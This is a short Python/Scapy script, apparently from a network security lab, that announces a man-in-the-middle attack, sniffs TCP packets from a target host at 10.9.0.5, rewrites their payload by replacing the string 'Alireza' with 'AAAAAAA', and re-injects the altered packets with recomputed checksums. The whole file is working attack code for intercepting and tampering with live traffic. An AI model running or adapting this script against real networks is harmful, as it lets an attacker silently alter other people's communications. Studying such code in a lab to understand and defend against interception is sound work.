#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

TARGET_IP = "10.9.0.5"

def spoof_pkt(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            print("*** %s, length: %d" % (data, len(data)))

            newdata = data.replace(b'Alireza', b'AAAAAAA')
            # Replace a pattern
            send(newpkt/newdata)
        else: 
            send(newpkt)

# BPF filter for TCP packets from specific source IP
f = f'tcp and src host {TARGET_IP}'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
